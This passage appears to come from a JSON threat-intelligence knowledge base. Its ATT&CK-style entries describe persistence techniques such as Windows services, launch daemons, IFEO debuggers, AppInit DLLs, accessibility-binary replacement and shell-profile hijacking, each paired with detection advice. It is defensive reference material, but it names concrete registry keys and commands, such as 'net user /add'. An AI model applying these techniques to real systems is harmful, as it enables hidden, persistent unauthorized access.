        "description": " \nAdversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.  \n\nThis is technically a deprecated technology (superseded by  Launch Daemon ), and thus the appropriate folder,  /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist),  StartupParameters.plist , reside in the top-level directory. \nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism  \n. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.  ",
        "detection": "\nThe /Library/StartupItems folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.\n\n"
      },
      "T1176": {
        "name": "Browser Extensions",
        "description": " \nAdversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.  \n  \n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.  \nOnce the extension is installed, it can browse to websites in the background,  \n  \nsteal all information that a user enters into a browser (including credentials)  \n  \nand be used as an installer for a RAT for persistence. \nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.  \nThere have also been similar examples of extensions being used for command & control  \n.  ",
        "detection": "\nInventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\n\n"
      },
      "T1554": {
        "name": "Compromise Client Software Binary",
        "description": " \nAdversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers. \nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.  ",
        "detection": "\nCollect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. Consider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.\n\n"
      },
      "T1136": {
        "name": "Create Account",
        "description": " \nAdversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system. \nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.  ",
        "detection": "\nMonitor for processes and command-line parameters associated with account creation, such as net user or useradd. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.   Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.Collect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\n\n"
      },
      "T1136.001": {
        "name": "Local Account",
        "description": " \nAdversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the  net user /add command can be used to create a local account. \nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.  ",
        "detection": "\nMonitor for processes and command-line parameters associated with local account creation, such as net user /add or useradd. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system.   Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.\n\n"
      },
      "T1136.002": {
        "name": "Domain Account",
        "description": " \nAdversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the  net user /add /domain command can be used to create a domain account. \nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.  ",
        "detection": "\nMonitor for processes and command-line parameters associated with domain account creation, such as net user /add /domain. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller.   Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.\n\n"
      },
      "T1136.003": {
        "name": "Cloud Account",
        "description": " \nAdversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.  \n \n \n \n \n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.  ",
        "detection": "\nCollect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\n\n"
      },
      "T1543": {
        "name": "Create or Modify System Process",
        "description": " \nAdversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.  \nOn macOS, launchd processes known as  Launch Daemon and  Launch Agent are run to finish system initialization and load user specific parameters.  \n \nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect. \nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.  \n.  ",
        "detection": "\nMonitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Monitor for changes to files associated with system-level processes.\n\n"
      },
      "T1543.001": {
        "name": "Launch Agent",
        "description": " \nAdversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in  /System/Library/LaunchAgents ,  /Library/LaunchAgents , and  $HOME/Library/LaunchAgents   \n  \n  \n. These launch agents have property list files which point to the executables that will be launched  \n. \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  \n  \n. The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  \n  \n. They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).  ",
        "detection": "\nMonitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\n"
      },
      "T1543.002": {
        "name": "Systemd Service",
        "description": " \nAdversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.  \n \nSystemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems. \nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the  /etc/systemd/system and  /usr/lib/systemd/system directories and have the file extension  .service . Each service unit file may contain numerous directives that can execute system commands: ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. ExecReload directive covers when a service restarts. ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'. \nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.  \n\nWhile adversaries typically require root privileges to create/modify service unit files in the  /etc/systemd/system and  /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as  ~/.config/systemd/user/ to achieve user-level persistence.  \n ",
        "detection": "\nSystemd service unit files may be detected by auditing file creation and modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and /home//.config/systemd/user/ directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: systemctl list-units -–type=service –all. Analyze the contents of .service files present on the file system and ensure that they refer to legitimate, expected executables.Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as /usr/sbin/service may reveal malicious systemd service execution.\n\n"
      },
      "T1543.003": {
        "name": "Windows Service",
        "description": " \nAdversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.  \nWindows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and  Reg . \nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system. \nAn adversary may also incorporate  Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through  Service Execution .  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at HKLM\\SYSTEM\\CurrentControlSet\\Services. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.  Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045   ). New, benign services may be created during installation of new software.Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1543.004": {
        "name": "Launch Daemon",
        "description": " \nAdversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in  /System/Library/LaunchDaemons and  /Library/LaunchDaemons   \n. These LaunchDaemons have property list files which point to the executables that will be launched  \n. \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  \n. The daemon name may be disguised by using a name from a related operating system or benign software  \n. Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.  ",
        "detection": "\nMonitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application. \n\n"
      },
      "T1546": {
        "name": "Event Triggered Execution",
        "description": " \nAdversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.  \n \n \n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.  ",
        "detection": "\nMonitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. These mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. Monitor for processes, API/System calls, and other common ways of manipulating these event repositories. Tools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. \n\n"
      },
      "T1546.001": {
        "name": "Change Default File Association",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access  \n  \nor by administrators using the built-in assoc utility.  \nApplications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. \nSystem file associations are listed under  HKEY_CLASSES_ROOT.[extension] , for example  HKEY_CLASSES_ROOT.txt . The entries point to a handler for that extension located at  HKEY_CLASSES_ROOT[handler] . The various commands are then listed as subkeys underneath the shell key at  HKEY_CLASSES_ROOT[handler]\\shell[action]\\command . For example:   HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command   HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command *  HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command \nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.  \n ",
        "detection": "\nCollect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.User file association preferences are stored under  [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts and override associations configured under [HKEY_CLASSES_ROOT]. Changes to a user's preference will occur under this entry's subkeys.Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.\n\n"
      },
      "T1546.002": {
        "name": "Screensaver",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.  \nThe Windows screensaver application scrnsave.scr is located in  C:\\Windows\\System32\\ , and  C:\\Windows\\sysWOW64\\ on 64-bit Windows systems, along with screensavers included with base Windows installations. \nThe following screensaver settings are stored in the Registry (  HKCU\\Control Panel\\Desktop\\ ) and could be manipulated to achieve persistence:  SCRNSAVE.exe - set to malicious PE path  ScreenSaveActive - set to '1' to enable the screensaver  ScreenSaverIsSecure - set to '0' to not require a password to unlock  ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed \nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.  \n ",
        "detection": "\nMonitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.\n\n"
      },
      "T1546.003": {
        "name": "Windows Management Instrumentation Event Subscription",
        "description": " \nAdversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.  \n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.  \n  \nAdversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.  \n  \n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.  ",
        "detection": "\nMonitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.    Monitor processes and command-line arguments that can be used to register WMI persistence, such as the  Register-WmiEvent PowerShell cmdlet  , as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).\n\n"
      },
      "T1546.004": {
        "name": ".bash_profile and .bashrc",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by a user’s shell.  ~/.bash_profile and  ~/.bashrc are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. \n ~/.bash_profile is executed for login shells and  ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the  ~/.bash_profile script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the  ~/.bashrc script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment. \nThe macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling  ~/.bash_profile each time instead of  ~/.bashrc . \nAdversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.  \n ",
        "detection": "\nWhile users may customize their ~/.bashrc and ~/.bash_profile files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\n"
      },
      "T1546.005": {
        "name": "Trap",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by an interrupt signal. The  trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like  ctrl+c and  ctrl+d . \nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format  trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.  \n \n ",
        "detection": "\nTrap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.\n\n"
      },
      "T1546.006": {
        "name": "LC_LOAD_DYLIB Addition",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.  \nThere are tools available to perform these changes. \nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.  \n ",
        "detection": "\nMonitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.\n\n"
      },
      "T1546.007": {
        "name": "Netsh Helper DLL",
        "description": " \nAdversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  \nThe paths to registered netsh.exe helper DLLs are entered into the Windows Registry at  HKLM\\SOFTWARE\\Microsoft\\Netsh . \nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.  \n \n ",
        "detection": "\nIt is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the HKLM\\SOFTWARE\\Microsoft\\Netsh registry key for any new or suspicious entries that do not correlate with known system files or benign software.  \n\n"
      },
      "T1546.008": {
        "name": "Accessibility Features",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system. \nTwo common accessibility programs are  C:\\Windows\\System32\\sethc.exe , launched when the shift key is pressed five times and  C:\\Windows\\System32\\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.  \n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).  \nThe  Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. \nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\\Windows\\System32\\utilman.exe ) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.  \n\nOther accessibility features exist that may also be leveraged in a similar fashion:  \n \nOn-Screen Keyboard:  C:\\Windows\\System32\\osk.exe Magnifier:  C:\\Windows\\System32\\Magnify.exe Narrator:  C:\\Windows\\System32\\Narrator.exe Display Switcher:  C:\\Windows\\System32\\DisplaySwitch.exe App Switcher:  C:\\Windows\\System32\\AtBroker.exe  ",
        "detection": "\nChanges to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options.\n\n"
      },
      "T1546.009": {
        "name": "AppCert DLLs",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppCertDLLs Registry key under  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions  CreateProcess ,  CreateProcessAsUser ,  CreateProcessWithLoginW ,  CreateProcessWithTokenW , or  WinExec .  \n\nSimilar to  Process Injection , this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.  ",
        "detection": "\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.   Tools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location.    Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\n\n"
      },
      "T1546.010": {
        "name": "AppInit DLLs",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppInit_DLLs value in the Registry keys  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or  HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.  \n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  \nMalicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.  \n ",
        "detection": "\nMonitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.  Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs.   Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\n\n"
      },
      "T1546.011": {
        "name": "Application Shimming",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.  \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:  %WINDIR%\\AppPatch\\sysmain.sdb and  hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb \nCustom databases are stored in:  %WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom and  hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom \nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to  Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). \nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  \nShims can also be abused to establish persistence by continuously being invoked by affected programs.  ",
        "detection": "\nThere are several public tools available that will detect shims that are currently available  :Shim-Process-Scanner - checks memory of every running process for any shim flagsShim-Detector-Lite - detects installation of custom shim databasesShim-Guard - monitors registry for any shim installationsShimScanner - forensic tool to find active shims in memoryShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.\n\n"
      },
      "T1546.012": {
        "name": "Image File Execution Options Injection",
        "description": " \nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\\dbg\\ntsd.exe -g  notepad.exe ).  \n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  \nIFEOs are represented as  Debugger values in the Registry under  HKLM\\SOFTWARE{{\\Wow6432Node}}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where  <executable> is the binary on which the debugger is attached.  \n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).  \n  \nSimilar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\ .  \n  \n\nSimilar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges.  \n\nSimilar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  \nInstalling IFEO mechanisms may also provide Persistence via continuous triggered invocation. \nMalware may also use IFEO to  Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.  \n  \n ",
        "detection": "\nMonitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS.  Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.  \n\n"
      },
      "T1546.013": {
        "name": "PowerShell Profile",
        "description": " \nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (  profile.ps1 ) is a script that runs when  PowerShell starts and can be used as a logon script to customize user environments. \n PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for  PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n \nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or  PowerShell drives to gain persistence. Every time a user opens a  PowerShell session the modified script will be executed unless the  -NoProfile flag is used when it is launched.  \n \nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.  \n ",
